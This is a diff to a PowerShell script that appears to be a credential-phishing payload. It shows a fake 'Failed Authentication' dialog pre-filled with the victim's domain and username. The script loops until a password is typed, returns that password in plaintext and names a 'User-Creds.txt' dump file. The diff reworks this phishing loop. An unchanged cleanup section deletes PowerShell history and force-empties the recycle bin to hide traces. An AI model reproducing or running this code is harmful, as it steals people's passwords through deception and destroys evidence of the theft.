@@ -52,18 +52,31 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 #>
 
 function Get-Creds {
-do{
-$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
-   if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
-    [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
-    Get-Creds
-}
-$creds = $cred.GetNetworkCredential() | fl
-return $creds
-  # ...
 
-  $done = $true
-} until ($done)
+$form = $null
+
+while ($form -eq $null)
+{
+    $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
+    $cred.getnetworkcredential().password
+
+    if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
+    {
+        Add-Type -AssemblyName PresentationCore,PresentationFramework
+	$msgBody = "Credentials cannot be empty!"
+	$msgTitle = "Error"
+	$msgButton = 'Ok'
+	$msgImage = 'Stop'
+	$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+	Write-Host "The user clicked: $Result"
+        $form = $null
+    }
+    
+    else{
+    $creds = $cred.GetNetworkCredential() | fl
+    return $creds
+    }
+}
 
 }
 
@@ -218,4 +231,6 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 # Deletes contents of recycle bin
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+exit
 
